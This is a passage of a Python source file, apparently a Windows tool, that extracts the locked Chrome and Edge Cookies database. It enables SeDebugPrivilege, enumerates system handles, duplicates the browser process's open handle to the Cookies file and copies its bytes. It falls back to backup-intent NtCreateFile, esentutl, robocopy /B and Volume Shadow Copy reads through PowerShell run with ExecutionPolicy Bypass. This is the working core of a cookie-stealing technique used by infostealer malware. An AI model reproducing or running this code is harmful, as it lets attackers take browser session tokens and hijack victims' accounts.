    def _worker() -> None:
        try:
            _win_dup_handle_copy_inner(src, dest)
        except BaseException as exc:  # noqa: BLE001
            err.append(exc)
        finally:
            done.set()

    thread = threading.Thread(target=_worker, name="kannon-dup-handle", daemon=True)
    thread.start()
    if not done.wait(_DUP_HANDLE_TIMEOUT_S):
        raise OSError(32, "dup_handle_timeout")
    if dest.is_file() and dest.stat().st_size > 0 and _sqlite_has_cookie_table(dest):
        return
    if err:
        raise err[0]
    raise OSError(32, "dup_handle_not_found")


def _win_dup_handle_copy_inner(src: Path, dest: Path) -> None:
    """Duplicate the open Cookies handle from chrome.exe / msedge.exe (same user)."""
    import ctypes
    from ctypes import wintypes

    deadline = time.monotonic() + _DUP_HANDLE_TIMEOUT_S
    try:
        _enable_privilege("SeDebugPrivilege")
    except OSError:
        pass
    want = _normalize_win_path(str(src.resolve()))
    kernel32 = _kernel32()
    kernel32.DuplicateHandle.argtypes = [
        wintypes.HANDLE,
        wintypes.HANDLE,
        wintypes.HANDLE,
        ctypes.POINTER(wintypes.HANDLE),
        wintypes.DWORD,
        wintypes.BOOL,
        wintypes.DWORD,
    ]
    kernel32.DuplicateHandle.restype = wintypes.BOOL
    duplicate_same_access = 0x00000002
    generic_read = 0x80000000
    file_type_disk = 1

    exe_names = _browser_exe_names_for_path(src)
    ranked = _rank_browser_pids(_windows_browser_pids(exe_names))
    rm_pids = {p for p in _rm_file_pids(src) if p}
    pids: list[int] = []
    for pid in list(rm_pids) + ranked:
        if pid and pid not in pids:
            pids.append(pid)
    pids = pids[:_DUP_HANDLE_MAX_PIDS]
    if not pids:
        raise OSError(32, "No chrome.exe/msedge.exe process for handle dup")
    pid_set = set(pids)
    handle_pairs = _system_handle_pairs(pid_set, deadline=deadline)
    if not handle_pairs:
        for pid in pids:
            if time.monotonic() > deadline:
                raise OSError(32, "dup_handle_timeout")
            hproc = _open_browser_process(kernel32, pid)
            if not hproc:
                continue
            try:
                for handle_value in _process_handles(hproc):
                    handle_pairs.append((pid, handle_value))
                    if len(handle_pairs) >= _DUP_HANDLE_MAX_HANDLES:
                        break
            finally:
                kernel32.CloseHandle(hproc)
            if len(handle_pairs) >= _DUP_HANDLE_MAX_HANDLES:
                break
    opened: dict[int, Any] = {}
    scanned = 0
    peeks = 0
    try:
        for pid, handle_value in handle_pairs:
            if scanned >= _DUP_HANDLE_MAX_HANDLES or time.monotonic() > deadline:
                raise OSError(32, "dup_handle_timeout")
            scanned += 1
            hproc = opened.get(pid)
            if hproc is None:
                hproc = _open_browser_process(kernel32, pid)
                if not hproc:
                    continue
                opened[pid] = hproc
            dup = wintypes.HANDLE()
            if not kernel32.DuplicateHandle(
                hproc,
                wintypes.HANDLE(handle_value),
                kernel32.GetCurrentProcess(),
                ctypes.byref(dup),
                generic_read,
                False,
                0,
            ) and not kernel32.DuplicateHandle(
                hproc,
                wintypes.HANDLE(handle_value),
                kernel32.GetCurrentProcess(),
                ctypes.byref(dup),
                0,
                False,
                duplicate_same_access,
            ):
                continue
            try:
                if kernel32.GetFileType(dup) != file_type_disk:
                    continue
                path = _final_path_from_handle(dup) or _object_name_from_handle(dup)
                matched = _paths_match(path, want) or _path_looks_like_cookies(path)
                if not matched and path and not _path_looks_like_sqlite_name(path):
                    continue
                if not matched:
                    size = _handle_file_size(dup)
                    if size is not None and (size < 64 or size > 64 * 1024 * 1024):
                        continue
                    if pid not in rm_pids:
                        if peeks >= _DUP_SQLITE_PEEK_MAX:
                            continue
                        peeks += 1
                try:
                    _copy_dup_handle_bytes(dup, dest)
                except OSError:
                    try:
                        dest.unlink()
                    except OSError:
                        pass
                    continue
                if dest.is_file() and dest.stat().st_size > 0:
                    if matched or _sqlite_has_cookie_table(dest):
                        return
                    try:
                        dest.unlink()
                    except OSError:
                        pass
            finally:
                kernel32.CloseHandle(dup)
    finally:
        for hproc in opened.values():
            kernel32.CloseHandle(hproc)
    raise OSError(32, "dup_handle_not_found")


def _open_browser_process(kernel32: Any, pid: int) -> Any:
    from ctypes import wintypes

    for access in (0x0040 | 0x0400, 0x0040 | 0x1000, 0x0040):
        hproc = kernel32.OpenProcess(access, False, pid)
        if hproc:
            return hproc
    return None


def _browser_exe_names_for_path(src: Path) -> set[str]:
    text = _normalize_win_path(str(src))
    if "microsoft\\edge" in text:
        return {"msedge.exe"}
    return {"chrome.exe"}


def _rank_browser_pids(pids: list[int]) -> list[int]:
    """Network service holds Cookies. Scan that PID before renderers."""
    network: list[int] = []
    storage: list[int] = []
    utility: list[int] = []
    rest: list[int] = []
    for pid in pids:
        cmd = _process_command_line(pid).casefold()
        if "network.mojom" in cmd or "utility-sub-type=network" in cmd:
            network.append(pid)
        elif "storage.mojom" in cmd or "utility-sub-type=storage" in cmd:
            storage.append(pid)
        elif "--type=utility" in cmd:
            utility.append(pid)
        else:
            rest.append(pid)
    return network + storage + utility + rest


def _process_command_line(pid: int) -> str:
    if os.name != "nt" or not pid:
        return ""
    try:
        import ctypes
        from ctypes import wintypes

        kernel32 = _kernel32()
        hproc = kernel32.OpenProcess(0x1000, False, pid)  # PROCESS_QUERY_LIMITED
        if not hproc:
            return ""
        try:
            ntdll = ctypes.WinDLL("ntdll")
            ntdll.NtQueryInformationProcess.restype = ctypes.c_long
            size = 0x2000
            buf = ctypes.create_string_buffer(size)
            needed = ctypes.c_ulong()
            status = int(
                ntdll.NtQueryInformationProcess(
                    hproc, 60, buf, size, ctypes.byref(needed)
                )
            )
            if status != 0:
                return ""

            class US(ctypes.Structure):
                _fields_ = [
                    ("Length", wintypes.USHORT),
                    ("MaximumLength", wintypes.USHORT),
                    ("Buffer", ctypes.c_void_p),
                ]

            us = US.from_buffer_copy(buf.raw[: ctypes.sizeof(US)])
            if us.Length and us.Buffer:
                try:
                    return ctypes.wstring_at(us.Buffer, us.Length // 2)
                except (ValueError, OSError, ctypes.ArgumentError):
                    pass
            # Command line often follows the UNICODE_STRING in the same buffer.
            off = ctypes.sizeof(US)
            return ctypes.wstring_at(ctypes.addressof(buf) + off, max(0, us.Length // 2))
        finally:
            kernel32.CloseHandle(hproc)
    except (AttributeError, OSError, ValueError, TypeError, OverflowError):
        return ""


def _rm_file_pids(path: Path) -> list[int]:
    """Restart Manager: which PIDs hold Cookies (Chrome 151 network/storage)."""
    if os.name != "nt":
        return []
    try:
        import ctypes
        from ctypes import wintypes

        rstrtmgr = ctypes.WinDLL("rstrtmgr")
        session = wintypes.DWORD()
        keybuf = ctypes.create_unicode_buffer(33)
        rstrtmgr.RmStartSession.argtypes = [
            ctypes.POINTER(wintypes.DWORD),
            wintypes.DWORD,
            wintypes.LPWSTR,
        ]
        rstrtmgr.RmStartSession.restype = wintypes.DWORD
        if rstrtmgr.RmStartSession(ctypes.byref(session), 0, keybuf) != 0:
            return []

        class RM_UNIQUE_PROCESS(ctypes.Structure):
            _fields_ = [
                ("dwProcessId", wintypes.DWORD),
                ("ProcessStartTime", wintypes.FILETIME),
            ]

        class RM_PROCESS_INFO(ctypes.Structure):
            _fields_ = [
                ("Process", RM_UNIQUE_PROCESS),
                ("strAppName", ctypes.c_wchar * 256),
                ("strServiceShortName", ctypes.c_wchar * 64),
                ("ApplicationType", ctypes.c_uint),
                ("AppStatus", wintypes.ULONG),
                ("TSSessionId", wintypes.DWORD),
                ("bRestartable", wintypes.BOOL),
            ]

        try:
            rstrtmgr.RmRegisterResources.argtypes = [
                wintypes.DWORD,
                wintypes.UINT,
                ctypes.POINTER(ctypes.c_wchar_p),
                wintypes.UINT,
                wintypes.LPVOID,
                wintypes.UINT,
                wintypes.LPVOID,
            ]
            rstrtmgr.RmRegisterResources.restype = wintypes.DWORD
            name = ctypes.c_wchar_p(str(path.resolve()))
            files = (ctypes.c_wchar_p * 1)(name)
            if rstrtmgr.RmRegisterResources(session, 1, files, 0, None, 0, None) != 0:
                return []
            needed = wintypes.UINT(0)
            count = wintypes.UINT(0)
            reboot = wintypes.DWORD()
            rstrtmgr.RmGetList.argtypes = [
                wintypes.DWORD,
                ctypes.POINTER(wintypes.UINT),
                ctypes.POINTER(wintypes.UINT),
                ctypes.POINTER(RM_PROCESS_INFO),
                ctypes.POINTER(wintypes.DWORD),
            ]
            rstrtmgr.RmGetList.restype = wintypes.DWORD
            err = rstrtmgr.RmGetList(
                session,
                ctypes.byref(needed),
                ctypes.byref(count),
                None,
                ctypes.byref(reboot),
            )
            n = int(needed.value or 0)
            if n <= 0:
                return []
            infos = (RM_PROCESS_INFO * n)()
            count = wintypes.UINT(n)
            err = rstrtmgr.RmGetList(
                session,
                ctypes.byref(needed),
                ctypes.byref(count),
                infos,
                ctypes.byref(reboot),
            )
            if err not in (0, 234):
                return []
            return [
                int(infos[i].Process.dwProcessId)
                for i in range(int(count.value or 0))
                if infos[i].Process.dwProcessId
            ]
        finally:
            rstrtmgr.RmEndSession.argtypes = [wintypes.DWORD]
            rstrtmgr.RmEndSession.restype = wintypes.DWORD
            rstrtmgr.RmEndSession(session)
    except (AttributeError, OSError, ValueError, TypeError, OverflowError):
        return []


def _system_handle_pairs(
    pids: set[int], *, deadline: float | None = None
) -> list[tuple[int, int]]:
    """SYSTEM_HANDLE_INFORMATION_EX — more reliable than per-process class 51."""
    if not pids:
        return []
    try:
        import ctypes
        from ctypes import wintypes

        class ENTRY(ctypes.Structure):
            _fields_ = [
                ("Object", ctypes.c_void_p),
                ("UniqueProcessId", ctypes.c_void_p),
                ("HandleValue", ctypes.c_void_p),
                ("GrantedAccess", wintypes.ULONG),
                ("CreatorBackTraceIndex", wintypes.USHORT),
                ("ObjectTypeIndex", wintypes.USHORT),
                ("HandleAttributes", wintypes.ULONG),
                ("Reserved", wintypes.ULONG),
            ]

        ntdll = ctypes.WinDLL("ntdll")
        ntdll.NtQuerySystemInformation.restype = ctypes.c_long
        system_extended_handle_information = 64
        status_length = 0xC0000004
        size = 1 << 20
        out: list[tuple[int, int]] = []
        for _ in range(6):
            if deadline is not None and time.monotonic() > deadline:
                return out
            if size > _SYSTEM_HANDLE_BUF_MAX:
                return out
            buf = ctypes.create_string_buffer(size)
            needed = ctypes.c_ulong()
            status = int(ntdll.NtQuerySystemInformation(
                system_extended_handle_information,
                buf,
                size,
                ctypes.byref(needed),
            )) & 0xFFFFFFFF
            if status == status_length:
                nxt = max(size * 2, int(needed.value or 0) + 4096)
                size = min(nxt, _SYSTEM_HANDLE_BUF_MAX)
                if size == _SYSTEM_HANDLE_BUF_MAX and nxt > size:
                    return out
                continue
            if status != 0:
                return []
            number = int(ctypes.cast(buf, ctypes.POINTER(ctypes.c_void_p))[0] or 0)
            header = ctypes.sizeof(ctypes.c_void_p) * 2
            entry_size = ctypes.sizeof(ENTRY)
            max_i = min(max(0, number), (size - header) // entry_size)
            arr = ctypes.cast(
                ctypes.addressof(buf) + header, ctypes.POINTER(ENTRY)
            )
            for i in range(max_i):
                if deadline is not None and i % 256 == 0 and time.monotonic() > deadline:
                    return out
                ent = arr[i]
                pid = int(ent.UniqueProcessId or 0)
                if pid not in pids or not ent.HandleValue:
                    continue
                out.append((pid, int(ent.HandleValue)))
                if len(out) >= _DUP_HANDLE_MAX_HANDLES:
                    return out
            return out
    except (AttributeError, OSError, ValueError, TypeError, OverflowError):
        return []
    return []


def _windows_browser_pids(names: set[str] | None = None) -> list[int]:
    import ctypes
    from ctypes import wintypes

    names = names or {"chrome.exe", "msedge.exe"}
    snap_process = 0x00000002

    class PROCESSENTRY32W(ctypes.Structure):
        _fields_ = [
            ("dwSize", wintypes.DWORD),
            ("cntUsage", wintypes.DWORD),
            ("th32ProcessID", wintypes.DWORD),
            ("th32DefaultHeapID", ctypes.c_void_p),
            ("th32ModuleID", wintypes.DWORD),
            ("cntThreads", wintypes.DWORD),
            ("th32ParentProcessID", wintypes.DWORD),
            ("pcPriClassBase", ctypes.c_long),
            ("dwFlags", wintypes.DWORD),
            ("szExeFile", wintypes.WCHAR * 260),
        ]

    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    snap = kernel32.CreateToolhelp32Snapshot(snap_process, 0)
    if int(snap) in {-1, 0xFFFFFFFF, 0xFFFFFFFFFFFFFFFF}:
        return []
    pids: list[int] = []
    try:
        entry = PROCESSENTRY32W()
        entry.dwSize = ctypes.sizeof(PROCESSENTRY32W)
        if not kernel32.Process32FirstW(snap, ctypes.byref(entry)):
            return []
        while True:
            exe = (entry.szExeFile or "").lower()
            if exe in names:
                pids.append(int(entry.th32ProcessID))
            if not kernel32.Process32NextW(snap, ctypes.byref(entry)):
                break
    finally:
        kernel32.CloseHandle(snap)
    return pids


def _process_handles(hproc: Any) -> list[int]:
    import ctypes
    from ctypes import wintypes

    ntdll = ctypes.WinDLL("ntdll")
    process_handle_information = 51
    status_length = 0xC0000004

    class ENTRY(ctypes.Structure):
        _fields_ = [
            ("HandleValue", ctypes.c_void_p),
            ("HandleCount", ctypes.c_void_p),
            ("PointerCount", ctypes.c_void_p),
            ("GrantedAccess", wintypes.ULONG),
            ("ObjectTypeIndex", wintypes.ULONG),
            ("HandleAttributes", wintypes.ULONG),
            ("Reserved", wintypes.ULONG),
        ]

    size = 0x10000
    for _ in range(8):
        buf = ctypes.create_string_buffer(size)
        needed = ctypes.c_ulong()
        status = ntdll.NtQueryInformationProcess(
            hproc,
            process_handle_information,
            buf,
            size,
            ctypes.byref(needed),
        )
        status &= 0xFFFFFFFF
        if status == status_length:
            size = max(size * 2, int(needed.value or 0) + 4096)
            continue
        if status != 0:
            return []
        number = ctypes.cast(buf, ctypes.POINTER(ctypes.c_void_p))[0]
        count = int(number)
        # NumberOfHandles + Reserved, then ENTRY array.
        header = ctypes.sizeof(ctypes.c_void_p) * 2
        out: list[int] = []
        for i in range(max(0, count)):
            off = header + i * ctypes.sizeof(ENTRY)
            if off + ctypes.sizeof(ENTRY) > size:
                break
            ent = ENTRY.from_buffer_copy(buf.raw[off : off + ctypes.sizeof(ENTRY)])
            if ent.HandleValue:
                out.append(int(ent.HandleValue))
        return out
    return []


def _final_path_from_handle(handle: Any) -> str:
    import ctypes
    from ctypes import wintypes

    kernel32 = _kernel32()
    buf = ctypes.create_unicode_buffer(2048)
    for flags in (0, 2):  # VOLUME_NAME_DOS, VOLUME_NAME_NT
        n = kernel32.GetFinalPathNameByHandleW(handle, buf, 2048, flags)
        if n:
            return buf.value or ""
    return _file_name_from_handle(handle) or _object_name_from_handle(handle)


def _object_name_from_handle(handle: Any) -> str:
    """NtQueryObject ObjectNameInformation when GetFinalPathName is empty."""
    if os.name != "nt":
        return ""
    try:
        import ctypes
        from ctypes import wintypes

        ntdll = ctypes.WinDLL("ntdll")
        ntdll.NtQueryObject.restype = ctypes.c_long
        ntdll.NtQueryObject.argtypes = [
            wintypes.HANDLE,
            ctypes.c_uint,
            ctypes.c_void_p,
            ctypes.c_ulong,
            ctypes.POINTER(ctypes.c_ulong),
        ]
        h = handle if isinstance(handle, wintypes.HANDLE) else wintypes.HANDLE(int(handle))
        buf = ctypes.create_string_buffer(2048)
        needed = ctypes.c_ulong(0)
        status = int(ntdll.NtQueryObject(h, 1, buf, 2048, ctypes.byref(needed)))
        if status != 0:
            return ""

        class UNICODE_STRING(ctypes.Structure):
            _fields_ = [
                ("Length", wintypes.USHORT),
                ("MaximumLength", wintypes.USHORT),
                ("Buffer", ctypes.c_void_p),
            ]

        us = UNICODE_STRING.from_buffer_copy(buf.raw[: ctypes.sizeof(UNICODE_STRING)])
        if not us.Buffer or us.Length < 2:
            return ""
        return ctypes.wstring_at(us.Buffer, int(us.Length) // 2) or ""
    except (AttributeError, OSError, ValueError, TypeError, OverflowError):
        return ""


def _file_name_from_handle(handle: Any) -> str:
    """FileNameInfo works when GetFinalPathName is empty in the Chrome sandbox."""
    import ctypes
    from ctypes import wintypes

    class FILE_NAME_INFO(ctypes.Structure):
        _fields_ = [
            ("FileNameLength", wintypes.DWORD),
            ("FileName", wintypes.WCHAR * 1024),
        ]

    kernel32 = _kernel32()
    h = handle if isinstance(handle, wintypes.HANDLE) else wintypes.HANDLE(int(handle))
    info = FILE_NAME_INFO()
    if not kernel32.GetFileInformationByHandleEx(
        h, 2, ctypes.byref(info), ctypes.sizeof(info)  # FileNameInfo
    ):
        return ""
    n = int(info.FileNameLength) // 2
    if n <= 0:
        return ""
    return "".join(info.FileName[: min(n, 1024)])


def _normalize_win_path(path: str) -> str:
    text = (path or "").strip().replace("/", "\\")
    if text.startswith("\\\\?\\"):
        text = text[4:]
    if text.lower().startswith("unc\\"):
        text = "\\\\" + text[4:]
    text = _win_volume_to_dos(text)
    return text.casefold()


def _win_volume_to_dos(path: str) -> str:
    r"""\\?\Volume{guid}\... or \Device\HarddiskVolumeN\... → C:\..."""
    text = path
    lower = text.lower()
    if lower.startswith("volume{"):
        idx = text.find("}\\")
        if idx != -1:
            vol = "\\\\?\\Volume" + text[6 : idx + 1] + "\\"
            rest = text[idx + 2 :]
            drive = _volume_guid_to_drive(vol)
            if drive:
                return drive.rstrip("\\") + "\\" + rest.lstrip("\\")
    if lower.startswith("\\device\\harddiskvolume"):
        drive = _device_volume_to_drive(text)
        if drive:
            return drive
    return text


def _volume_guid_to_drive(volume: str) -> str:
    if os.name != "nt":
        return ""
    try:
        import ctypes
        from ctypes import wintypes

        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        buf = ctypes.create_unicode_buffer(256)
        kernel32.GetVolumePathNamesForVolumeNameW.restype = wintypes.BOOL
        if kernel32.GetVolumePathNamesForVolumeNameW(volume, buf, 256, None):
            return (buf.value or "").split("\x00")[0]
    except (AttributeError, OSError, ValueError, TypeError):
        return ""
    return ""


def _device_volume_to_drive(path: str) -> str:
    if os.name != "nt":
        return ""
    try:
        import ctypes

        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        lower = path.replace("/", "\\")
        # \Device\HarddiskVolumeN\...
        parts = lower.split("\\")
        if len(parts) < 4:
            return ""
        device = "\\".join(parts[:4])  # \Device\HarddiskVolumeN
        rest = "\\".join(parts[4:])
        buf = ctypes.create_unicode_buffer(1024)
        for letter in "CDEFGHIJKLMNOPQRSTUVWXYZ":
            n = kernel32.QueryDosDeviceW(f"{letter}:", buf, 1024)
            if not n:
                continue
            mapped = (buf.value or "").rstrip("\\")
            if mapped.lower() == device.lower():
                return f"{letter}:\\" + rest
    except (AttributeError, OSError, ValueError, TypeError):
        return ""
    return ""


def _handle_file_size(handle: Any) -> int | None:
    import ctypes
    from ctypes import wintypes

    kernel32 = _kernel32()
    h = handle if isinstance(handle, wintypes.HANDLE) else wintypes.HANDLE(int(handle))
    size = ctypes.c_longlong(0)
    try:
        if kernel32.GetFileSizeEx(h, ctypes.byref(size)):
            return int(size.value)
    except (OSError, TypeError, ValueError, OverflowError):
        return None
    return None


def _path_looks_like_cookies(path: str) -> bool:
    text = _normalize_win_path(path)
    return bool(text) and text.endswith("\\cookies")


def _path_looks_like_sqlite_name(path: str) -> bool:
    text = _normalize_win_path(path)
    if not text:
        return True
    name = text.rsplit("\\", 1)[-1]
    return name in {"cookies", "cookies-journal"} or name.endswith("-wal")


def _sqlite_has_cookie_table(path: Path) -> bool:
    """True when dest is a SQLite cookies DB. Path match often fails in the sandbox."""
    try:
        if not path.is_file() or path.stat().st_size < 64:
            return False
        with path.open("rb") as fh:
            if fh.read(16) != _SQLITE_MAGIC:
                return False
    except OSError:
        return False
    try:
        conn = sqlite3.connect(f"{path.resolve().as_uri()}?mode=ro", uri=True)
        try:
            row = conn.execute(
                "SELECT 1 FROM sqlite_master WHERE type='table' AND name='cookies' LIMIT 1"
            ).fetchone()
            return bool(row)
        finally:
            conn.close()
    except sqlite3.Error:
        return False


def _try_handle_dup_copy(src: Path, dest: Path) -> bool:
    if os.name != "nt":
        return False
    try:
        _win_dup_handle_copy(src, dest)
    except OSError:
        return False
    return dest.is_file() and dest.stat().st_size > 0 and _sqlite_has_cookie_table(dest)


def _call_with_timeout(fn: Any, timeout_s: float, default: Any) -> Any:
    """Return default if fn blocks (COM LocalServer wait is ~60s)."""
    box: list[Any] = []

    def _worker() -> None:
        try:
            box.append(("ok", fn()))
        except Exception as exc:  # noqa: BLE001
            box.append(("err", exc))

    thread = threading.Thread(target=_worker, name="kannon-timeout", daemon=True)
    thread.start()
    thread.join(timeout_s)
    if thread.is_alive() or not box:
        return default
    kind, payload = box[0]
    if kind == "err":
        raise payload
    return payload


def _paths_match(got: str, want: str) -> bool:
    a = _normalize_win_path(got)
    b = _normalize_win_path(want)
    if not a or not b:
        return False
    if a == b:
        return True
    a_parts = [p for p in a.split("\\") if p]
    b_parts = [p for p in b.split("\\") if p]
    if len(a_parts) >= 3 and a_parts[-3:] == b_parts[-3:]:
        return True
    a_tail = "\\".join(a.split("\\")[-4:])
    b_tail = "\\".join(b.split("\\")[-4:])
    return bool(a_tail) and a_tail == b_tail


def _win_ntcreatefile_backup_copy(src: Path, dest: Path) -> None:
    """NtCreateFile + FILE_OPEN_FOR_BACKUP_INTENT (SeBackupPrivilege)."""
    if os.name != "nt":
        raise OSError(32, "nt_backup is Windows-only")
    import ctypes
    from ctypes import wintypes

    try:
        _enable_privilege("SeBackupPrivilege")
    except OSError:
        pass
    try:
        _enable_privilege("SeRestorePrivilege")
    except OSError:
        pass

    class UNICODE_STRING(ctypes.Structure):
        _fields_ = [
            ("Length", wintypes.USHORT),
            ("MaximumLength", wintypes.USHORT),
            ("Buffer", wintypes.LPWSTR),
        ]

    class OBJECT_ATTRIBUTES(ctypes.Structure):
        _fields_ = [
            ("Length", wintypes.ULONG),
            ("RootDirectory", wintypes.HANDLE),
            ("ObjectName", ctypes.POINTER(UNICODE_STRING)),
            ("Attributes", wintypes.ULONG),
            ("SecurityDescriptor", ctypes.c_void_p),
            ("SecurityQualityOfService", ctypes.c_void_p),
        ]

    class IO_STATUS_BLOCK(ctypes.Structure):
        _fields_ = [
            ("Status", ctypes.c_void_p),
            ("Information", ctypes.c_void_p),
        ]

    nt_path = _nt_native_path(src)
    buf = ctypes.create_unicode_buffer(nt_path)
    us = UNICODE_STRING()
    us.Length = len(nt_path) * 2
    us.MaximumLength = (len(nt_path) + 1) * 2
    us.Buffer = ctypes.cast(ctypes.addressof(buf), wintypes.LPWSTR)
    oa = OBJECT_ATTRIBUTES()
    oa.Length = ctypes.sizeof(OBJECT_ATTRIBUTES)
    oa.RootDirectory = None
    oa.ObjectName = ctypes.pointer(us)
    oa.Attributes = 0x40  # OBJ_CASE_INSENSITIVE
    oa.SecurityDescriptor = None
    oa.SecurityQualityOfService = None
    handle = wintypes.HANDLE()
    iosb = IO_STATUS_BLOCK()
    ntdll = ctypes.WinDLL("ntdll")
    ntdll.NtCreateFile.argtypes = [
        ctypes.POINTER(wintypes.HANDLE),
        wintypes.DWORD,
        ctypes.POINTER(OBJECT_ATTRIBUTES),
        ctypes.POINTER(IO_STATUS_BLOCK),
        ctypes.c_void_p,
        wintypes.ULONG,
        wintypes.ULONG,
        wintypes.ULONG,
        wintypes.ULONG,
        ctypes.c_void_p,
        wintypes.ULONG,
    ]
    ntdll.NtCreateFile.restype = ctypes.c_long
    status = int(
        ntdll.NtCreateFile(
            ctypes.byref(handle),
            0x80000000 | 0x00100000,  # GENERIC_READ | SYNCHRONIZE
            ctypes.byref(oa),
            ctypes.byref(iosb),
            None,
            0x80,  # FILE_ATTRIBUTE_NORMAL
            0x00000001 | 0x00000002 | 0x00000004,
            1,  # FILE_OPEN
            0x00000020 | 0x00000040 | 0x00004000,  # SYNC | NONDIR | BACKUP_INTENT
            None,
            0,
        )
    ) & 0xFFFFFFFF
    if status != 0 or not handle:
        raise OSError(status or 32, "NtCreateFile backup open failed")
    kernel32 = _kernel32()
    try:
        _read_handle_to_file(handle, dest)
    finally:
        kernel32.CloseHandle(handle)


def _win_esentutl_copy(src: Path, dest: Path) -> None:
    dest.parent.mkdir(parents=True, exist_ok=True)
    exe = Path(os.environ.get("WINDIR") or r"C:\Windows") / "System32" / "esentutl.exe"
    if not exe.is_file():
        raise OSError(2, "esentutl.exe missing")
    run = subprocess.run(
        [str(exe), "/y", str(src), "/d", str(dest)],
        capture_output=True,
        timeout=20,
        check=False,
    )
    if run.returncode != 0 or not dest.is_file() or dest.stat().st_size <= 0:
        raise OSError(run.returncode or 32, "esentutl copy failed")


def _win_robocopy_backup_copy(src: Path, dest: Path) -> None:
    dest.parent.mkdir(parents=True, exist_ok=True)
    run = subprocess.run(
        [
            "robocopy",
            str(src.parent),
            str(dest.parent),
            src.name,
            "/B",
            "/COPY:D",
            "/R:0",
            "/W:0",
            "/NFL",
            "/NDL",
            "/NJH",
            "/NJS",
        ],
        capture_output=True,
        timeout=20,
        check=False,
    )
    # robocopy 0-7 = success-ish
    copied = dest.parent / src.name
    if copied != dest and copied.is_file():
        shutil.copyfile(copied, dest)
    if run.returncode >= 8 or not dest.is_file() or dest.stat().st_size <= 0:
        raise OSError(run.returncode or 32, "robocopy /B failed")


def _win_vss_existing_copy(src: Path, dest: Path) -> None:
    """Copy from an existing shadow (no Create). Admin not required to list."""
    src = src.resolve()
    rel = str(src)[len(src.drive) :].lstrip("\\/")
    dest.parent.mkdir(parents=True, exist_ok=True)
    script = (
        "param($Rel,$Dest)\n"
        "$ErrorActionPreference='Stop'\n"
        "$sc=Get-CimInstance Win32_ShadowCopy | Sort-Object InstallDate -Descending | "
        "Select-Object -First 4\n"
        "if(-not $sc){ throw 'VSS none' }\n"
        "$ok=$false\n"
        "foreach($s in @($sc)){\n"
        "  $p=$s.DeviceObject+'\\'+$Rel\n"
        "  if(Test-Path -LiteralPath $p){ Copy-Item -LiteralPath $p -Destination $Dest -Force; $ok=$true; break }\n"
        "}\n"
        "if(-not $ok){ throw 'VSS existing miss' }\n"
    )
    tmp = tempfile.NamedTemporaryFile("w", suffix=".ps1", delete=False, encoding="utf-8")
    try:
        tmp.write(script)
        tmp.close()
        run = subprocess.run(
            [
                "powershell.exe",
                "-NoProfile",
                "-NonInteractive",
                "-ExecutionPolicy",
                "Bypass",
                "-File",
                tmp.name,
                rel,
                str(dest),
            ],
            capture_output=True,
            text=True,
            timeout=25,
            check=False,
        )
    finally:
        try:
            os.unlink(tmp.name)
        except OSError:
            pass
    if run.returncode != 0 or not dest.is_file() or dest.stat().st_size <= 0:
        raise OSError(run.returncode or 32, "VSS existing copy failed")


_VSS_SHADOW_ID_RE = re.compile(
    r"Shadow Copy (?:set )?ID:\s*(\{[0-9A-Fa-f-]{36}\})", re.I
)
_VSS_SHADOW_VOL_RE = re.compile(
    r"Shadow Copy Volume(?: Name)?:\s*"
    r"(\\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy\d+)",
    re.I,
)


def _windows_system32_exe(name: str) -> str:
    """64-bit System32 binary even when this process is WOW64."""
    windir = os.environ.get("WINDIR") or r"C:\Windows"
    for folder in ("Sysnative", "System32"):
        candidate = Path(windir) / folder / name
        if candidate.is_file():
            return str(candidate)
    return name


def _windows_powershell() -> str:
    """64-bit Windows PowerShell even when this process is WOW64."""
    windir = os.environ.get("WINDIR") or r"C:\Windows"
    for rel in (
        ("Sysnative", "WindowsPowerShell", "v1.0", "powershell.exe"),
        ("System32", "WindowsPowerShell", "v1.0", "powershell.exe"),
    ):
        candidate = Path(windir).joinpath(*rel)
        if candidate.is_file():
            return str(candidate)
    return "powershell.exe"


def _read_vss_status_file(path: Path) -> str:
    try:
        text = path.read_text(encoding="ascii", errors="ignore").strip()
    except OSError:
        return ""
    if not text:
        return ""
    return _safe_snapshot_detail(text.splitlines()[0])[:80]


def _parse_vss_create_output(text: str) -> tuple[str, str] | None:
    """Shadow ID + GLOBALROOT device only. Ignores any other text."""
    if not text:
        return None
    ids = _VSS_SHADOW_ID_RE.findall(text)
    vols = _VSS_SHADOW_VOL_RE.findall(text)
    if ids and vols:
        return ids[-1], vols[-1]
    return None


def _prefer_vss_status(cur: str, new: str) -> str:
    """Keep a Create ReturnValue over a wrapper MethodInvocationException."""
    new = (new or "").strip()
    if not new:
        return cur
    if new.startswith("create:") and new[7:].isdigit():
        return new
    if not cur or cur.startswith("exc:MethodInvocationException"):
        return new
    return cur


def _try_vss_create_copy(src: Path, dest: Path) -> bool:
    """Always attempt VSS CREATE for Chrome Default. Record HRESULT / skip."""
    if os.name != "nt":
        _record_vss("skipped:not_nt")
        return False
    try:
        _win_vss_copy(src, dest)
    except OSError as exc:
        if not _cache.get("vss"):
            _record_vss(_safe_os_error(exc))
        return False
    except Exception as exc:  # noqa: BLE001 — create result must be visible
        _record_vss(f"exc:{type(exc).__name__}")
        return False
    if dest.is_file() and dest.stat().st_size > 0:
        if not _cache.get("vss"):
            _record_vss("ok")
        return True
    if not _cache.get("vss"):
        _record_vss("create:empty")
    return False


def _vss_create_ps1() -> str:
    """CIM Create first — [wmiclass].Create throws 0x80131501 on this PC."""
    return (
        "param($ArgsFile)\n"
        "$ErrorActionPreference='Continue'\n"
        "$lines=Get-Content -LiteralPath $ArgsFile\n"
        "$letter=([string]$lines[0]).Trim().TrimEnd('\\')\n"
        "$Drive=$letter+'\\'\n"
        "$Rel=[string]$lines[1]\n"
        "$Dest=[string]$lines[2]\n"
        "$Status=[string]$lines[3]\n"
        "$id=$null\n"
        "$last='exc:none'\n"
        "function Write-Status([string]$s){\n"
        "  Set-Content -LiteralPath $Status -Value $s -Encoding ascii\n"
        "}\n"
        "function Format-Exc($err){\n"
        "  $ex=$err.Exception; $parts=@()\n"
        "  while($ex -ne $null){\n"
        "    $parts += $ex.GetType().Name\n"
        "    try { $hr=[int]$ex.HResult; if($hr){ "
        "$parts += ('0x{0:X8}' -f $hr) } } catch {}\n"
        "    $ex=$ex.InnerException\n"
        "  }\n"
        "  return 'exc:'+($parts -join ':')\n"
        "}\n"
        "function Find-Device([string]$sid){\n"
